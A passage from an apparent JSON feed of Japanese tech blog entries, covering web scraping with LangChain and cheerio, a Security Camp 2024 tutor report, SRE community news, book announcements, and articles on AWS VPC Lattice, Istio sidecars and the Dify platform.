$(\'.all_recipe_btn\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'all_recipe_btn\', \'event_label\' : \'all_recipe_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'all_recipe_btn\', {\'all_recipe_btn\' : \'all_recipe_btn\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_left\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'Visseel\', \'event_label\' : \'Visseel\'}); gtag(\'event\',\\\\n\\" +      \\"\'Visseel\', {\'Visseel\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'all_recipe_btn\'}); }); $(\'.sports_wrap .bun_left\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'Visseel\', \'event_label\' :\\\\n\\" +      \\"\'Visseel\'}); gtag(\'event\', \'Visseel\', {\'Visseel\' : \'Visseel\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_right\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'DeNA\', \'event_label\' : \'DeNA\'}); gtag(\'event\', \'DeNA\',\\\\n\\" +      \\"{\'DeNA\' : \'DeNA\'}); }); $(\'.sale_bnr\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'sale_bnr_mini\', \'event_label\' : \'sale_bnr_mini\'});\\\\n\\" +      \\"gtag(\'event\', \'sale_bnr_mini\', {\'sale_bnr_mini\' : \'sale_bnr_mini\'}); });\\\\n\\" +      \\"$(\'.top_ec_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_ec_btn\', \'event_label\' : \'top_ec_btn\'}); gtag(\'event\', \'top_ec_btn\',\\\\n\\" +      \\"{\'top_ec_btn\' : \'top_ec_btn\'}); }); $(\'.top_halal_btn\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\\\n\\" +      \\"\'top_halal_btn\'}); }); $(\'.gyomuca_slide\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'gyomuca_slide\', \'event_label\' : \'gyomuca_slide\'});\\\\n\\" +      \\"gtag(\'event\', \'gyomuca_slide\', {\'gyomuca_slide\' : \'gyomuca_slide\'}); });\\\\n\\" +      \\"$(\'.gyomuca_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'gyomuca_btn\', \'event_label\' : \'gyomuca_btn\'}); gtag(\'event\', \'gyomuca_btn\',\\\\n\\" +      \\"{\'gyomuca_btn\' : \'gyomuca_btn\'}); }); $(\'.top_shop_bnr a\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_shop_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); gtag(\'event\', \'top_shop_bnr\', {\'top_shop_bnr\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); }); $(\'.top_bargain_bnr a\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'top_bargain_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_bargain_bnr\'}); gtag(\'event\', \'top_bargain_bnr\', {\'top_bargain_bnr\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"a\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_bargain_bnr\', \'event_label\' : \'top_bargain_bnr\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_bargain_bnr\', {\'top_bargain_bnr\' : \'top_bargain_bnr\'}); });\\\\n\\" +      \\"$(document).ready(function() { $(\'.drawer\').drawer(); }); //infoaccordion\\\\n\\" +      `$(function(){ $(\\".infoac dt\\").not(\'#noicon\').on(\\"click\\", function() {\\\\n` +      \'$(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); }); }); //scroll\\\\n\' +      `$(function(){ // #で始まるリンクをクリックしたら実行されます $(\'a[href^=\\"#\\"]\').click(function() { //\\\\n` +      \'スクロールの速度 var speed = 600; // ミリ秒で記述 var href= $(this).attr(\\"href\\"); var target =\\\\n\' +      `$(href == \\"#\\" || href == \\"\\" ? \'html\' : href); var position =\\\\n` +      \\"target.offset().top; $(\'body,html\').animate({scrollTop:position}, speed,\\\\n\\" +      \\"\'swing\'); return false; }); }); //matchHeight $(function(){\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"var position = target.offset().top; $(\'body,html\').animate({scrollTop:position},\\\\n\\" +      \\"speed, \'swing\'); return false; }); }); //matchHeight $(function(){\\\\n\\" +      \\"$(\'.mh\').matchHeight(); }); function news_link(id,year) {\\\\n\\" +      \'document.newslink.ne_id.value=id; document.newslink.ne_year.value=year;\\\\n\' +      \'document.newslink.submit(); } $(function(){ $(\\"#acMenu dt\\").on(\\"click\\",\\\\n\' +      \'function() { $(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); });\\\\n\' +      \'}); $(\\".information dl dt\\\\n\' +      `p:contains(\'「酒類の品目等の表示義務」改正に伴う「麦旨」の品目表示及び税率適用区分表示の変更について\')\\").find(\'a\').attr({target:\\"_blank\\"});\\\\n` +      \'objectFitImages();\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  }]CheerioWebBaseLoaderはbodyタグ内を読むのですが、styleタグやscriptタグが入ってしまっているからなんですね。そこで、CheerioWebBaseLoaderを使わず、URLからfetchして、cheerioTextで得たbodyタグの中からstyleタグやscriptタグの中身を除去したコードを実行。npx ts-node webLoad.ts https://www.gyomusuper.jp/綺麗に取れました！！bodyContent:お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針ホーム商品紹介ミラクルレシピ特集一覧安心安全の取り組み業務スーパーとはGyomucaお問い合わせオンラインショップFC加盟店募集会社案内日本語/ENGLISH/中文NEWITEM新着商品新着ホット＆スパイシーヌードルホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。詳しくはこちら詳しくはこちらPICKUP!おすすめ商品商品をもっと見る新着パルメザンチーズのリゾットイタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！詳しくはこちらパルメザンチーズ[要冷蔵]詳しくはこちらPICKUP!おすすめレシピレシピをもっと見るSPECIALTOPICS特集特集をもっと見るSNS公式Instagram・公式X（旧Twitter）TweetsbyGyomusuperOFCL公式Instagram公式X（旧Twitter）2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。一覧を見る『世界の本物』を直輸入！業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！安さの秘密自慢の国内自社工場の『オリジナル』国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！安全・安心の秘密スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。店舗検索特売情報ホームWEBチラシ店舗案内ミラクルレシピ商品紹介直輸入商品国内自社工場商品業務スーパーとは安さの秘密安全安心の取り組み商品開発事前チェック現地工場チェック品質安全検査商品検証FC加盟店募集業務スーパー5つの強み業務スーパーの特徴オープンまでのプロセス体制について契約概要・加盟条件物件・商品のご提案募集お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針〒675-0063兵庫県加古川市加古川町平野125番1\xa92018-GyomuSuperAllRightsReserved.","isoDate":"2024-08-31T13:34:16.000Z","dateMiliSeconds":1725111256000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"セキュリティ・キャンプ 2024 参加記","link":"https://moz-security.hatenablog.com/entry/2024/08/31/121836","contentSnippet":"8月12日から8月16日までの5日間で開催されたセキュリティ・キャンプ2024 全国大会のBクラス（プロダクトセキュリティ）にチューターとして参加したので、体験記を書き残す。昨年、Bクラス（当時は、Webセキュリティ）を修了し、今年チューターとして、もう一度セキュリティ・キャンプに参加することになった。昨年の参加記は、以下である。今読み返してみると、次はネクスト受講生かチューターで参加したいということを書いており、今年チューターとして参加できたのはとてもよかった。moz-security.hatenablog.com日程表Bクラスの日程は、このような感じだった。6つの専門講義があり、それに加えて共通講義やグループワーク, 特別講演などがあり、毎日8:30~21:00に稼働するというハードスケジュールとなっている。セキュリティ・キャンプ Bクラス スケジュール共通講義、グループワーク共通講義では、ゲームセキュリティや法律、人の心理・行動特性についての講義があった。また、毎日グループワークの時間が30分あり、1グループ4人構成でセキュリティ教育について話しあっていた。コンピュータを全く知らない主婦や子供からコンピュータサイエンスをある程度学んだ学生などさまざまなターゲットに対して、いろいろなアプローチでセキュリティ技術を伝えようとするアイデアがあり、ディスカッションや最終発表を見ていてとてもおもしろかった。専門講義Bクラスでは、プロダクト開発におけるセキュリティをテーマにして、講義が構成されていた。全て４時間の講義で、座学と演習の両方を行う形式になっている。1日目のホームルームでプロデューサーから、講義設計にあたり未知との遭遇の最大化を目標としている旨を伝えられた。知らないこともたくさん出てくるだろうが、「アウトプットを行う→フィードバックを得る→新たな知らないことが生まれる」のループを回すことをセキュリティキャンプを通じて、また、セキュリティキャンプが終わった後も行うことが大事だということを話されていた。また、技術の話だけでなくお金の話も講義に盛り込むようにしており、コストとセキュリティのバランスを見定めるといった、より社会で行われていることを体感して、社会に出た後に活躍してほしいというお話があった。そういう意味で、プロデューサーがBクラスは社会人クラスと言っていたのもおもしろかった。これら２つのことは、講義を全て終えた今、改めてとてもプロデューサーの講義設計に対する意図や思いを感じている。2日目B1: プロダクトセキュリティの展望セキュリティ・キャンプ2024 全国大会 B1 プロダクトセキュリティの展望(#seccamp2024) | ドクセル\\"プロダクトセキュリティの展望\\" では、プロダクトの定義とそれが指す範囲の広さ、非機能要件であるセキュリティと組織としての向き合い方について学んだ。なかでも、社会と技術と資産を面で見れるようになるとセキュリティを俯瞰して見ること・考えることができ、面で見れるようになるためには、社会の変化に敏感になることが重要であるということはとても記憶に残っている。セキュリティを仕事にする上で新技術の把握や継続的な学習は大事だと言われているが、この講義を通して再認識させられた。また、プロダクトの価値を早く・大きく・継続して届けるための技術についても学んだ。これらはお金が密接に絡んでくる点で経営側の視点も必要であり、今まで考えたことがなかったが、組織で自分が影響力を発揮していくためには押さえておく必要はあるし、今後勉強していきたいと思った。最後に、組織規模に応じたセキュリティ対策について学んだ。セキュリティ対策が必要だといっても実際に行うには導入・運用にコストがかかるため、コストとセキュリティのバランスが必要となってくるし、その判断が難しいのはよく言われているためすでにわかっていた。しかし、ではどれくらいの組織規模に対してどのような対策を行うのかということは今まであまり考えたことなく（学生で考える人はあまりいないと思っているが）、グループディスカッションや発表、講師以外の方のお話なども含めてとても学びになった。いろんな会社のいろんな役職の人たちがいるのもセキュリティ・キャンプのよさであると思う。B-2: 情報セキュリティ戦略戦術ワークショップ\\"情報セキュリティ戦略戦術ワークショップ\\" では、組織のセキュリティ対策の進め方やインシデントハンドリングについて学んだ。この講義でも、やはり組織規模に応じたセキュリティ対策についてのお話はあり、やらないといけないことはたくさんあるがどれから取り組むかを考えるといったときに、ベストプラクティスやガイドライン、フレームワークは非常に参考になることがわかった。また、インシデント対応において、まず気付ける仕組みと改善の実施が重要であることがわかった。たしかにログが残っていたり、インシデント発生時にアラートが出なかったりすると、そもそもインシデントに気付けない。そのため、セキュリティ担当でなかったとしても、インシデントに気付くために一開発者としてどのような情報（ログ, メトリクス, アラート）が必要なのかは考えるようにしたいと思った。演習では、受講生がグループでインシデントハンドリングを体験しており、チューターとしてはチャットツールでの関係者とのやり取りを見ていた。インシデントというと私は外部の攻撃者からのサイバー攻撃を想像してしまうが、それだけではない。メールの誤送信などといったオペレーションミスや部署間での情報共有の不足、内部不正なども、ちゃんとインシデントであり、それも意外と発生してしまうことがあることを学んだ。演習で関係者とのやりとりがなかなかうまくいかず、大変そうだったのはとても記憶に残っている（覚えるべきとこはそこじゃないw）。3日目B-3: セキュリティ監視入門セキュリティ監視入門 | Notion\\"セキュリティ監視入門\\" では、監視の重要性と監視アーキテクチャの設計・構築について学んだ。監視をする上で最も重要で、最初に考えなければいけないのはなぜ監視するのか・何のために監視するのかであり、そこが曖昧であると例え監視を行っていて異常を見つけたり、アラートが出たりしても、その後の対応に繋がらないということはとても頭に残っている。この講義でもB-1に引き続いて、組織規模に応じた監視アーキテクチャの構築やSOCやCSIRTといった組織の構築を学んだ。どれだけのコストをセキュリティ対策にかけるかは経営判断だが、現場で何が行われているのかやどのようなデータがどこに存在しているかは把握していなければ、セキュリティ監視を行うことやそれにかかるコストを見積もることはできない。ログの対象となるデータは無限と言っていいほど存在しており、どのログを取るのかとコストのバランスを考えることがセキュリティ担当者としての腕の見せ所であることがわかった。また、セキュリティ監視において大規模な運用が始まると不可逆性はかなり高いことも学んだ。これは、データ移行が大変になるからという理由だったが、私自身今までトライアンドエラーを繰り返すことをよしとしていたため、セキュリティ監視というケースではそれがあまりふさわしくないこともあることがわかった。B-4: モダンなプロダクト開発を攻撃者の視点で捉える\\"モダンなプロダクト開発を攻撃者の視点で捉える\\" では、攻撃者がどうやって組織に対して攻撃を行うのかについて学んだのちに、それにやられないために防御側はどのような対策が必要なのかということを考えた。講義を通して、攻撃側と防御側の両方の視点でセキュリティを考えることができたのは非常に学びになった。なかでも、攻撃者はフロー（グラフ）で考え、防御側はリストで考えるというのはとても記憶に残っている。攻撃側は一点だけでも突破できればいいのに対して、防御側は全てを守らなければならない。加えて、多層防御を行い、全てを守っていると思っていても、攻撃者は全く思わぬところからクリティカルな攻撃を行うかもしれない（VPNの脆弱性を突いて初期侵入とかではなく、物理的に侵入するとか）。そのため、セキュリティ担当者として組織を守るには、ベストプラクティスやガイドラインを参考にしつつ、明確なWhyを持ったセキュリティ対策を取るように意識することが重要になってくるとわかった。ゼロトラストやDevSecOpsといった新しく出てきたワードに縛られないようにすることも重要であり、それもWhyを意識することで具体的なセキュリティ対策の実現という本質的な部分に焦点を当てることができることを学んだ。大学や勉強会では防御について学んだり考えたりすることが多いが、攻撃側の視点を養うためにも、もっとHack The Boxを頑張ろうと思う。4日目B-5: 設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\"設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\" では、プロダクト開発において考慮すべきセキュリティと実践方法について学んだ。プロダクトをセキュアにするというと、実装する際に脆弱性を作らないよう気をつけたりリリース前に脆弱性診断を行ったりすることを私はイメージする。しかし、要件定義・設計・実装の段階にテスト工程を前倒しにするというShift-leftの理解と実践により、開発工程の早い段階で脆弱性の検出を行うことが重要であることがわかった。ただ、早い段階で脆弱性を発見しようとするとやらないといけないことが大量に増えるため、できるだけ自動化して、人でないとできない箇所に開発者が注力できる仕組みを作ることが大事だと学んだ。セキュリティに携わるものとして、意識改革やセキュリティ教育ももちろん大事だが、技術者である以上、仕組みで解決できないかという視点は大事だと思う。脆弱性を自動で発見する方法としてはSASTやDASTというものがあり、これらのツールを使ってスキャンを行うことを学んだ。これをCI/CDのパイプラインに組み込むことで、例えば、マージされたタイミングでSASTを行い、ステージング環境にデプロイしたタイミングでDASTを行うといったことができる。これにより、仮に開発者に全くセキュリティの知識がなくても、ある程度のセキュリティは担保することができることがわかった。B-6: クラウドネイティブなシステムを保護するための実践的KubernetesセキュリティGitHub - kyohmizu/seccamp2024-B6\\"クラウドネイティブなシステムを保護するための実践的Kubernetesセキュリティ\\" では、Kubernetesとは何かということととコンテナやKubernetesに対する脅威・セキュリティ対策について学んだ。なかでも、3章の攻撃シナリオを学び、実際に演習したことは記憶に残っている。Kubernetesやコンテナに対する攻撃手法として、コンテナブレイクアウトや認証情報の窃取があることはすでに知っていたが、それ単体で攻撃として成り立つわけではなく、攻撃の中の一工程に過ぎない。そのため、演習を通して、OSコマンドインジェクションの脆弱性を突いた後、徐々に範囲を拡大していき、最終的にKubernetesクラスタのAdmin権限取得まで行うとという経験ができたのはよかった。Kubernetesに対する脅威を身にしみて実感できたし、攻撃者が範囲を拡大していく（ラテラルムーブメント）どこか一箇所でも防ぐことができればここまでやられなかったかもしれないといった防御視点でも考えることができた。講義全体を通して昨年に引き続き、B-1からB-6まで非常に幅広い分野の講義があった。どの講義も講師の方が4時間で終わるか怪しいと講義前から言うほどのボリュームになっており、チューターとして参加しながらも、全てを理解できているわけではない。また、講義の位置付けとしては一応入門となっているし、講義資料には大量のリンクが貼ってある。これは、もっと勉強することはあるよというメッセージ？だろう。勉強するための足がかりも与えられた今、これらを活用して、今後さらに勉強していきたいと思う。また、どの講義でもコストとセキュリティについて取り上げられており、組織の中でセキュリティ対策を進めていこうと思うとコストとセキュリティを見定める能力（費用対効果を考える能力）は求められることを強く実感した。チューターとして立ち位置としては講師と受講生の間となるため、セキュリティ・キャンプ全体を通して、昨年よりもいろんな人といろんな話をすることができた気がする。今思い返すと、受講生として参加した昨年は講義に食らいつくのに必死だったし、自分のスキルに自信もなく、講師の方にも積極的に話を聞きにいこうとしていなかった。今年はチューターとして講義全体を俯瞰して見ることができ、受講生として参加したときよりも少しだけ気持ちに余裕が持てたのはよかったと思う。一方で、受講生の知識・スキルの高さには驚かされ、チューターと受講生というよりは、同じ関心を持つ同世代の仲間という気持ちで講義だけに限らず、休憩時間やご飯の時間も含めてたくさんの話ができたし、そのなかで勉強になることも多かった。チューターとして参加してみて、受講生が演習で困っているときに一緒に解決できたときには私も嬉しかったし、教えたり技術を広めることの面白さを少しだけ感じることができた気がする。セキュリティ・キャンプを修了した方には、チューターとしてセキュリティ・キャンプにもう一度参加することも検討に入れるのをお勧めしたい。感想どの講義も濃密で、チューターとして参加した今年も私にとって初めて知ることも多かった。勉強するきっかけをたくさん与えられるので、キャンプ中はもちろんのことキャンプ後も継続して勉強するネタが見つかるし、私自身これからもっと勉強したいと思う。また、受講生やチューターとして参加している同世代のすごい人たちやセキュリティの第一線で活躍している講師の方や関係者の方を見て話すことができ、今年もとても刺激を受けることができた。講義資料自体は講師の方が公開されているものも多くある（Bクラスの講義に限らず）ため、講師の方と話したり、みんなで議論したりできることこそがセキュリティ・キャンプに参加することの一番のよさであると思う。セキュリティに興味がある人はもちろん、もっと広くコンピュータに興味がある人全員にセキュリティ・キャンプを勧めたい。昨年書いていたので、今年も書いておこうと思う。来年はネクストの受講生としてまた戻ってきたい。Bクラス ほかの方のブログhack.nikkei.comzenn.dev","isoDate":"2024-08-31T03:18:36.000Z","dateMiliSeconds":1725074316000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"SRETT#10 ~ 夏のSRE祭り！アーカイブ動画公開！","link":"https://shu-kob.hateblo.jp/entry/2024/08/30/230631","contentSnippet":"shu-kob.hateblo.jp2024年8月23日に弊社スリーシェイクのコミュニティ勉強会「SRETT #10 ~ 夏のSRE祭り！」が開催されました。www.youtube.comアーカイブ動画も公開されています！当日ご参加できなかった方もぜひご覧ください！自分は当日誘導係をやっていて、最初の菱田さんのセッション「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」は最後のちょびっとだけしか聴けていないから、観ようかな。","isoDate":"2024-08-30T14:06:31.000Z","dateMiliSeconds":1725026791000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"オライリーのAWS生成AI本","link":"https://shu-kob.hateblo.jp/entry/2024/08/29/234143","contentSnippet":"AWSではじめる生成AI ―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje Barth,Shelbee EigenbrodeオライリージャパンAmazonそういや、オライリージャパンからAWSの生成AI本出てますね。欲しいと思いながらも買うてない。現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、面白そうなら買うてみるしか！翻訳はAWS Japanの久富木 隆一さん。AWSの中の人が翻訳しているので確かでしょうね！","isoDate":"2024-08-29T14:41:43.000Z","dateMiliSeconds":1724942503000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"「SREをはじめよう」(Becoming SRE邦訳)が出版","link":"https://shu-kob.hateblo.jp/entry/2024/08/28/235736","contentSnippet":"SREをはじめよう ―個人と組織による信頼性獲得への第一歩作者:David N. Blank-EdelmanオライリージャパンAmazon「Becoming SRE」の邦訳である「SREをはじめよう」が2024/10/8オライリージャパンから発売されます！翻訳は、オライリーのSRE系の邦訳を数多く手掛けられてきた山口 能迪さん（Google所属）個人がSREになる、組織がSREになるという二面で書かれているようで、今からとても楽しみです！","isoDate":"2024-08-28T14:57:36.000Z","dateMiliSeconds":1724857056000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス","link":"https://shu-kob.hateblo.jp/entry/2024/08/27/235840","contentSnippet":"pages.sreake.comイベントで登壇していました。ご参加くださった方はありがとうございました！良い評価をいただけたようで光栄です！今回、「生成AI利活用を進めるためのプロセス」というテーマだったので、普段私があまり話さないことも話せて新鮮でした。genai-users.connpass.com普段は、日本生成AIユーザ会でハンズオンをやっているように、具体的技術を話すことが多いので。今回とても良い経験になりました。今後も良い発表ができるよう精進していきます！","isoDate":"2024-08-27T14:58:40.000Z","dateMiliSeconds":1724770720000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"VPC Latticeについて","link":"https://zenn.dev/k_nagase/articles/vpc_lattice_basic","contentSnippet":"VPC LatticeとはVPC Latticeはサービス間を接続し、監視・通信の暗号化・認証認可などの機能を提供するサービスです。いわゆるLinkerdやIstioのようなサービスメッシュツールのようなイメージで利用できます。具体的には以下のような機能があります。サービス間通信における認証機能(IAM)アクセスログやメトリクスの収集などのモニタリングサービスディスカバリmTLS化ユーザ定義のカスタムドメインでの名前解決 ユースケース複数のプロダクトを各チームが個別にAWSアカウント単位またはVPC単位で管理しており、それらをメッシュ上に通信可能にするような...","isoDate":"2024-08-27T07:38:56.000Z","dateMiliSeconds":1724744336000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"後継者不足のCOBOLを生成AIに引き継ぎ","link":"https://shu-kob.hateblo.jp/entry/2024/08/26/235854","contentSnippet":"www.itmedia.co.jpIT media AI+より。虚構新聞かと思いましたが（笑）、本当にようです。ベトナムの研究者が論文を出したのですね。日本でもCOBOLで書かれたシステムはまだまだ残っていますが、COBOL書けるエンジニアが高齢になってきて、後継者不足でもあります。海外もベトナムも同様なのですね。リプレイスしていくのも大事かと思いますが、全部のCOBOLシステムのリプレイスも難しいでしょうし、リプレイスしつつも、生成AIに書かせるのが現実解なのかもしれません。","isoDate":"2024-08-26T14:58:54.000Z","dateMiliSeconds":1724684334000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"IstioのサイドカーコンテナをKubernetesのサイドカーコンテナ機能で起動する","link":"https://zenn.dev/k_nagase/articles/istio_native_sidecar","contentSnippet":"はじめにKubernetes v1.29からサイドカーコンテナ機能が実装されました。これはメインコンテナとは別にロギングやプロキシのような周辺機能を追加するための機能です。Istioでもネットワークプロキシとしてenvoyコンテナをメインコンテナとは別にインジェクションし、1つのPodに仕立て上げます。しかしこれには問題があり、Jobを起動した際にメインコンテナが正常終了した後でもenvoyが終了せずにPodが残り続けてしまうといった事象がありました。こういったIstio利用における問題点を解消するのにKubernetesネイティブなサイドカーコンテナ機能が役立ちます。以降...","isoDate":"2024-08-26T04:15:35.000Z","dateMiliSeconds":1724645735000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"生成AIアプリケーション開発ノーコードフレームワークDify","link":"https://shu-kob.hateblo.jp/entry/2024/08/25/233704","contentSnippet":"dify.ai最近、Difyの話題をよく聞くので、軽くご紹介したいと思います。Difyとは？ 生成AIアプリ開発を劇的に簡素化するプラットフォームDifyは、生成AIアプリケーションをノーコードで開発できる、非常に革新的なプラットフォームです。これまで、生成AIアプリの開発は、高度なプログラミングスキルを必要とし、専門エンジニアでなければ実現が難しいものでした。しかし、Difyの登場により、この状況が一変。非エンジニアでも、直感的な操作で複雑なAIアプリケーションを構築できるようになりました。Difyが選ばれる理由ノーコード開発: プログラミングの知識がなくても、ブロックを組み合わせるように視覚的にアプリを構築できます。RAG（Retrieval Augmented Generation）対応: 大規模言語モデル（LLM）と外部データソースを連携させ、より高度なAI機能を実現できます。オープンソース: プラットフォーム自体がオープンソースであり、自由にカスタマイズ・拡張できます。高機能: チャットボット、AIアシスタント、要約ツールなど、さまざまなタイプの生成AIアプリを開発可能です。企業との連携: 既存の企業システムとの連携もスムーズに行え、業務効率化に貢献します。Difyの主な特徴柔軟性: AIプロセスを自由に組み合わせて、柔軟なアプリケーションを開発できます。統合性: 既存のシステムとの連携が容易で、企業内の既存のデータやシステムと統合できます。監視性: 実行時の状況を監視し、AIモデルの性能を継続的に改善できます。スケーラビリティ: 需要に応じて、簡単にシステムを拡張できます。Difyでできることチャットボットの開発: 自然な会話ができるチャットボットを簡単に作成できます。AIアシスタントの開発: 顧客対応や業務支援を行うAIアシスタントを開発できます。文書の自動生成: レポートや記事などを自動生成できます。データ分析: 大量のデータを分析し、有益な情報を抽出できます。Difyが注目される理由生成AIの民主化: 生成AIの技術を、より多くの人々に開放し、AIの活用範囲を広げます。開発コストの削減: 高度なエンジニアを雇用する必要がなく、開発コストを大幅に削減できます。開発期間の短縮: ノーコード開発により、開発期間を大幅に短縮できます。まとめDifyは、生成AIの開発を劇的に簡素化するプラットフォームです。非エンジニアでも、高度なAIアプリケーションを開発できるため、生成AIの活用範囲が大きく広がることが期待されています。もし、生成AIに興味があり、独自のアプリケーションを開発したいと考えているのであれば、Difyは非常に魅力的な選択肢と言えるでしょう。さらに詳しく知りたい方へDify公式サイト: https://dify.ai/jpDifyの始め方（非エンジニアでも生成AIアプリが作れる最強ツール）: https://zenn.dev/en2enzo2/articles/824877e1099508Difyは、生成AIの分野で注目を集めているプラットフォームです。ぜひ、この機会にDifyについて詳しく調べてみてください。何か他に知りたいことがあれば、お気軽にご質問ください。","isoDate":"2024-08-25T14:37:04.000Z","dateMiliSeconds":1724596624000,"authorName":"Shu 